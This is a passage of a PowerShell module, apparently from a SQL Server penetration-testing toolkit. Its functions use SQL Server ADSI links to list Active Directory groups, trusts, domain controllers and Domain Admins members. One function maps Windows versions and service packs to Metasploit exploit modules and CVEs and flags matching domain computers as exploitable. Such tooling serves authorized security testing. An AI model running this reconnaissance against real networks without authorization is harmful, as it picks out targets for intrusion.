        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup group filter
        if((-not $FilterGroup)){
            $FilterGroup = '*'
        }
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields 'samaccountname,adminCount,whencreated,whenchanged,adspath' -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectClass=Group)(SamAccountName=$FilterGroup))" -LdapFields 'samaccountname,adminCount,whencreated,whenchanged,adspath'            
        }
    }

    End
    {               
    }
}

Function  Get-SQLDomainTrust
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        $TblTrusts = New-Object System.Data.DataTable
        $TblTrusts.Columns.Add("TrustedDomain") | Out-Null
        $TblTrusts.Columns.Add("TrustedDomainDn") | Out-Null
        $TblTrusts.Columns.Add("Trusttype") | Out-Null
        $TblTrusts.Columns.Add("Trustdirection") | Out-Null
        $TblTrusts.Columns.Add("Trustattributes") | Out-Null
        $TblTrusts.Columns.Add("Whencreated") | Out-Null
        $TblTrusts.Columns.Add("Whenchanged") | Out-Null
        $TblTrusts.Columns.Add("Objectclass") | Out-Null
        $TblTrusts.Clear()
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectClass=trustedDomain)" -LdapFields 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath' -UseAdHoc            
        }else{
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectClass=trustedDomain)" -LdapFields 'trustpartner,distinguishedname,trusttype,trustdirection,trustattributes,whencreated,whenchanged,adspath'            
        }

        $Result | ForEach-Object {

            # Resolve trust direction
            $TrustDirection = Switch ($_.trustdirection) {
                0 { "Disabled" }
                1 { "Inbound" }
                2 { "Outbound" }
                3 { "Bidirectional" }
            }

            # Resolve trust attribute
            $TrustAttrib = Switch ($_.trustattributes){
                0x001 { "non_transitive" }
                0x002 { "uplevel_only" }
                0x004 { "quarantined_domain" }
                0x008 { "forest_transitive" }
                0x010 { "cross_organization" }
                0x020 { "within_forest" }
                0x040 { "treat_as_external" }
                0x080 { "trust_uses_rc4_encryption" }
                0x100 { "trust_uses_aes_keys" }
                Default {                 
                    $_.trustattributes
                }
            }

            # Resolve trust type
            # Reference: https://support.microsoft.com/en-us/kb/228477
            $TrustType = Switch ($_.trusttype){
                1 {"Downlevel Trust (Windows NT domain external)"}
                2 {"Uplevel Trust (Active Directory domain - parent-child, root domain, shortcut, external, or forest)"}
                3 {"MIT (non-Windows Kerberos version 5 realm)"}
                4 {"DCE (Theoretical trust type - DCE refers to Open Group's Distributed Computing)"}
            }

            # Add trust to table
            $TblTrusts.Rows.Add(
                [string]$_.trustpartner,
                [string]$_.distinguishedname,
                [string]$TrustType,
                [string]$TrustDirection,
                [string]$TrustAttrib,
                [string]$_.whencreated,
                [string]$_.whenchanged,
                [string]$_.objectclass
            ) | Out-Null

        }

        $TblTrusts
    }

    End
    {               
    }
}

Function  Get-SQLDomainController
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LdapFields 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -UseAdHoc            
        }else{
            Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))" -LdapFields 'name,dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
        }

    }

    End
    {               
    }
}

Function  Get-SQLDomainExploitableSystem
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }
        
        # Create data table for list of patches levels with a MSF exploit
        $TableExploits = New-Object System.Data.DataTable 
        $TableExploits.Columns.Add('OperatingSystem') | Out-Null 
        $TableExploits.Columns.Add('ServicePack') | Out-Null
        $TableExploits.Columns.Add('MsfModule') | Out-Null  
        $TableExploits.Columns.Add('CVE') | Out-Null
        
        # Add exploits to data table
        $TableExploits.Rows.Add("Windows 7","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 2","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 3","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","Service Pack 4","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/iis/ms03_007_ntdll_webdav","http://www.cvedetails.com/cve/2003-0109") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2000","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Server Pack 1","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/dcerpc/ms07_029_msdns_zonename","http://www.cvedetails.com/cve/2007-1748") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2003 R2","","exploit/windows/wins/ms04_045_wins","http://www.cvedetails.com/cve/2004-1080/") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Server 2008 R2","","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Server Pack 1","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows Vista","","exploit/windows/smb/ms09_050_smb2_negotiate_func_index","http://www.cvedetails.com/cve/2009-3103") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms04_011_lsass","http://www.cvedetails.com/cve/2003-0533/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms05_039_pnp","http://www.cvedetails.com/cve/2005-1983") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Server Pack 1","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_066_nwapi","http://www.cvedetails.com/cve/2006-4688") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms06_070_wkssvc","http://www.cvedetails.com/cve/2006-4691") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 2","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","Service Pack 3","exploit/windows/smb/ms10_061_spoolss","http://www.cvedetails.com/cve/2010-2729") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms03_026_dcom","http://www.cvedetails.com/cve/2003-0352/") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/dcerpc/ms05_017_msmq","http://www.cvedetails.com/cve/2005-0059") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms06_040_netapi","http://www.cvedetails.com/cve/2006-3439") | Out-Null  
        $TableExploits.Rows.Add("Windows XP","","exploit/windows/smb/ms08_067_netapi","http://www.cvedetails.com/cve/2008-4250") | Out-Null  

        # Create data table to house vulnerable server list
        $TableVulnComputers = New-Object System.Data.DataTable 
        $TableVulnComputers.Columns.Add('ComputerName') | Out-Null
        $TableVulnComputers.Columns.Add('OperatingSystem') | Out-Null
        $TableVulnComputers.Columns.Add('ServicePack') | Out-Null
        $TableVulnComputers.Columns.Add('LastLogon') | Out-Null
        $TableVulnComputers.Columns.Add('MsfModule') | Out-Null  
        $TableVulnComputers.Columns.Add('CVE') | Out-Null
    }

    Process
    {
        # Call Get-SQLDomainObject    
        if($UseAdHoc){
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount' -UseAdHoc            
        }else{
            $Result = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(objectCategory=Computer)" -LdapFields 'dnshostname,operatingsystem,operatingsystemversion,operatingsystemservicepack,whenchanged,logoncount'            
        }

        # Iterate through each exploit
        $TableExploits | ForEach-Object {
                     
            $ExploitOS = $_.OperatingSystem
            $ExploitSP = $_.ServicePack
            $ExploitMsf = $_.MsfModule
            $ExploitCve = $_.CVE

            # Iterate through each ADS computer
            $Result | ForEach-Object {
                
                $AdsHostname = $_.DNSHostName
                $AdsOS = $_.OperatingSystem
                $AdsSP = $_.OperatingSystemServicePack                                                      
                $AdsLast = $_.LastLogon
                
                # Add exploitable systems to vuln computers data table
                if ($AdsOS -like "$ExploitOS*" -and $AdsSP -like "$ExploitSP" ){                    
                   
                    # Add domain computer to data table                    
                    $TableVulnComputers.Rows.Add($AdsHostname,$AdsOS,$AdsSP,[dateTime]::FromFileTime($AdsLast),$ExploitMsf,$ExploitCve) | Out-Null 
                }

            }

        }

        $TableVulnComputers | Sort-Object { $_.lastlogon -as [datetime]} -Descending  

    }

    End
    {               
    }
}

Function  Get-SQLDomainGroupMember
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate to SQL Server.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate to SQL Server.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkUsername,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Domain account password used to authenticate to LDAP through SQL Server ADSI link.')]
        [string]$LinkPassword,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain group to filter for.')]
        [string]$FilterGroup,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Use adhoc connection for executing the query instead of a server link.  The link option (default) will create an ADSI server link and use OpenQuery. The AdHoc option will enable adhoc queries, and use OpenRowSet.')]
        [Switch]$UseAdHoc,

        [Parameter(Mandatory = $false,
        ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'Domain to query.')]
        [string]$TargetDomain,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # set instance to local host by default
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Setup group filter
        if((-not $FilterGroup)){
            $FilterGroup = 'Domain Admins'
        }

        $TableMembers = New-Object System.Data.DataTable
        $TableMembers.Columns.Add('Group') | Out-Null
        $TableMembers.Columns.Add('sAMAccountName') | Out-Null
        $TableMembers.Columns.Add('displayName') | Out-Null
    }

    Process
    {
        # Call Get-SQLDomainObject to get group DN
        if($UseAdHoc){
            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields 'distinguishedname' -UseAdHoc -SuppressVerbose
        }else{
            $FullDN = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=group)(samaccountname=$FilterGroup))" -LdapFields 'distinguishedname' -SuppressVerbose       
        }

        $DN = $FullDN.distinguishedname

        # Call Get-SQLDomainObject to get group membership
        if($UseAdHoc){
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields 'samaccountname,displayname' -UseAdHoc
        }else{
            $Results = Get-SQLDomainObject -Verbose -Instance $Instance -Username $Username -Password $Password -LinkUsername $LinkUsername -LinkPassword $LinkPassword -LdapPath $TargetDomain -LdapFilter "(&(objectCategory=user)(memberOf=$DN))" -LdapFields 'samaccountname,displayname'     
        }

        $Results | ForEach-Object {           
            $TableMembers.Rows.Add($FilterGroup,$_.samaccountname,$_.displayname) | Out-Null 
        }

        $TableMembers

    }

    End
    {               
    }
}

Function  Get-SQLSysadminCheck
{
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account to authenticate with.')]
        [string]$Username,

        [Parameter(Mandatory = $false,
        HelpMessage = 'SQL Server or domain account password to authenticate with.')]
        [string]$Password,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Windows credentials.')]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]$Credential = [System.Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = $false,
                ValueFromPipelineByPropertyName = $true,
        HelpMessage = 'SQL Server instance to connection to.')]
        [string]$Instance,

        [Parameter(Mandatory = $false,
        HelpMessage = 'Suppress verbose errors.  Used when function is wrapped.')]
        [switch]$SuppressVerbose
    )

    Begin
    {
        # Data for output
        $TblSysadminStatus = New-Object -TypeName System.Data.DataTable

        # Setup CredentialName filter
        if($CredentialName)
        {
            $CredentialNameFilter = " WHERE name like '$CredentialName'"
        }
        else
        {
            $CredentialNameFilter = ''
        }

    }

    Process
    {
        # Parse computer name from the instance
        $ComputerName = Get-ComputerNameFromInstance -Instance $Instance

        # Default connection to local default instance
        if(-not $Instance)
        {
            $Instance = $env:COMPUTERNAME
        }

        # Test connection to instance
        $TestConnection = Get-SQLConnectionTest -Instance $Instance -Username $Username -Password $Password -Credential $Credential -SuppressVerbose | Where-Object -FilterScript {
            $_.Status -eq 'Accessible'
        }
        if($TestConnection)
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Success."
            }
        }
        else
        {
            if( -not $SuppressVerbose)
            {
                Write-Verbose -Message "$Instance : Connection Failed."
            }
            return
        }

        # Define Query
        $Query = "SELECT    '$ComputerName' as [ComputerName],
            '$Instance' as [Instance],
            CASE
            WHEN IS_SRVROLEMEMBER('sysadmin') =  0 THEN 'No'
            ELSE 'Yes'
        END as IsSysadmin"

        # Execute Query
        $TblSysadminStatusTemp = Get-SQLQuery -Instance $Instance -Query $Query -Username $Username -Password $Password -Credential $Credential -SuppressVerbose

        # Append results
        $TblSysadminStatus = $TblSysadminStatus + $TblSysadminStatusTemp
    }

    End
    {
        # Return data
        $TblSysadminStatus
    }
}


Function  Get-SQLLocalAdminCheck
{
    Begin
    {
    }

    Process
    {
        # Get current windows user
        $WinCurrentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()

        # Get current windows username
        $WinCurrentUserName = $WinCurrentUser.name

        # Get current windows user's groups
